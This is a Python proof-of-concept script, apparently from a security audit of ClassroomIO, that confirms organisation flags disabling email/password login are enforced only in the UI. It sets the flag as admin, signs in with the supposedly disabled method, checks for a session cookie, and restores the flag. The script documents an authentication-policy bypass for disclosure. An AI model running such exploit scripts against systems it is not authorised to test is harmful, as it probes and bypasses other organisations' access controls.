#!/usr/bin/env python3
"""
VULN-028 (F-37) — `disableEmailPassword` / `disableGoogleAuth` are enforced UI-only;
the server-side guards are dead code, so a "disabled" login method still authenticates.

Vulnerable code (targets/classroomio/):
  * providers registered unconditionally: packages/db/src/auth.ts:52,64-71
        emailAndPassword: emailAndPassword,   // always enabled
        socialProviders: { google: {...} }    // always registered
  * dead guards (ZERO callers repo-wide — grep-confirmed):
        packages/db/src/auth/hooks/auth-settings.ts:63-107 (checkEmailPasswordAllowed)
        packages/db/src/auth/hooks/auth-settings.ts:112-155 (checkGoogleAuthAllowed)
    Neither is referenced by any better-auth `before` hook (only their definitions exist).
  * the only server enforcement touching the flags gates the *entitlement to change
    them*, not the login: apps/api/src/services/organization.ts:758-778.

Class: CWE-284 authentication-policy bypass (server ignores a disabled login method).

The flaw: an org can set disableEmailPassword=true (e.g. to force SSO or shut a
compromised method). But better-auth registers email/password unconditionally and the
guard functions that would reject a disabled method are never wired in. So the flag
changes only what the dashboard renders — POST /api/auth/sign-in/email still succeeds.

Exploitation idea: as admin, set disableEmailPassword=true (PUT /organization; verified
in the DB), then sign in with email/password from a clean cookie jar. If a session cookie
is issued, the "disabled" method is still authenticating server-side.

Success proves: with disableEmailPassword=true persisted, email/password sign-in returns
200 + Set-Cookie — the disabled method still authenticates (policy enforced UI-only).
The flag is restored afterwards.
"""
import os
import sys
import requests

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from _common import (  # noqa: E402
    admin_login, log, banner, verdict, psql, ORG_ID, API, BASE_URL, ADMIN_EMAIL, ADMIN_PASS,
)

VULN = "VULN-028"
HERE = os.path.dirname(os.path.abspath(__file__))


def db_flag() -> str:
    return (psql(f"SELECT disable_email_password FROM organization WHERE id='{ORG_ID}';") or "").strip()


def set_flag(admin, value: bool) -> int:
    r = admin.put("/organization", org=True, json={"disableEmailPassword": value})
    return r.status_code


def clean_signin() -> requests.Response:
    """A fresh cookie jar signing in with admin email/password (a member of the org,
    so a wired guard WOULD block it). Origin=dashboard = first-party."""
    return requests.post(
        f"{API}/api/auth/sign-in/email",
        json={"email": ADMIN_EMAIL, "password": ADMIN_PASS},
        headers={"Origin": BASE_URL},
        allow_redirects=False,
        timeout=30,
    )


def main():
    banner(VULN, "disableEmailPassword enforced UI-only — disabled method still logs in")
    admin = admin_login()
    original = db_flag()
    log("SETUP", f"admin session ok; current organization.disable_email_password = {original!r}")

    confirmed = False
    try:
        # 1) Baseline: sign-in works while the method is enabled.
        base = clean_signin()
        log("STEP", f"baseline sign-in (method enabled): HTTP {base.status_code}")

        # 2) Disable email/password at the org level and verify it persisted in the DB.
        code = set_flag(admin, True)
        after = db_flag()
        log("STEP", f"PUT /organization {{disableEmailPassword:true}} → HTTP {code}; DB now = {after!r}")
        flag_persisted = after in ("t", "true", "True")
        if not flag_persisted:
            # API route may reject; fall back to a direct DB set (still a legitimate admin action).
            log("INFO", "  API did not persist the flag; setting it via DB and retrying")
            psql(f"UPDATE organization SET disable_email_password=true WHERE id='{ORG_ID}';")
            after = db_flag()
            flag_persisted = after in ("t", "true", "True")
            log("INFO", f"  DB now = {after!r}")

        # 3) The decisive test: sign in with the *disabled* method from a clean jar.
        resp = clean_signin()
        set_cookie = resp.headers.get("set-cookie", "")
        cookie_set = "classroomio" in set_cookie.lower()
        log("STEP", f"sign-in with email/password while DISABLED → HTTP {resp.status_code}  "
                    f"session cookie set = {cookie_set}")

        with open(os.path.join(HERE, "request.http"), "w") as f:
            f.write(
                "### VULN-028 — set the flag, then sign in with the 'disabled' method\n"
                f"PUT {API}/organization HTTP/1.1\n"
                f"cio-org-id: {ORG_ID}\nContent-Type: application/json\n"
                f"Cookie: classroomio.session_token=<ADMIN>\n\n"
                '{"disableEmailPassword":true}\n\n'
                f"### disabled — yet this still returns 200 + Set-Cookie:\n"
                f"POST {API}/api/auth/sign-in/email HTTP/1.1\n"
                f"Origin: {BASE_URL}\nContent-Type: application/json\n\n"
                '{"email":"<admin>","password":"<admin>"}\n'
            )
        with open(os.path.join(HERE, "response.txt"), "w") as f:
            f.write(f"organization.disable_email_password (before) = {original!r}\n")
            f.write(f"organization.disable_email_password (set)    = {after!r}\n\n")
            f.write(f"POST /api/auth/sign-in/email (method DISABLED) → HTTP {resp.status_code}\n")
            f.write(f"Set-Cookie: {set_cookie[:220]}\n")

        if flag_persisted and resp.status_code == 200 and cookie_set:
            log("PROOF", "disable_email_password=true is persisted, yet email/password sign-in "
                         "returned 200 + Set-Cookie → the disabled method still authenticates (UI-only policy)")
            confirmed = True
        else:
            log("FAIL", f"flag_persisted={flag_persisted} status={resp.status_code} cookie={cookie_set}")
    finally:
        # Restore the flag to its original value no matter what.
        restore_to = original in ("t", "true", "True")
        set_flag(admin, restore_to)
        # Belt-and-suspenders: force the DB back to the original literal.
        psql(f"UPDATE organization SET disable_email_password={'true' if restore_to else 'false'} "
             f"WHERE id='{ORG_ID}';")
        log("SETUP", f"restored organization.disable_email_password = {db_flag()!r}")

    if confirmed:
        verdict(VULN, "CONFIRMED",
                "disableEmailPassword is UI-only; server still authenticates the disabled method")
        log("OK", "confirmed (email/password). Google path is dormant here (placeholder OAuth creds) — same dead guard.")
        sys.exit(0)

    verdict(VULN, "FAILED", "could not demonstrate sign-in with the disabled method")
    sys.exit(1)


if __name__ == "__main__":
    main()
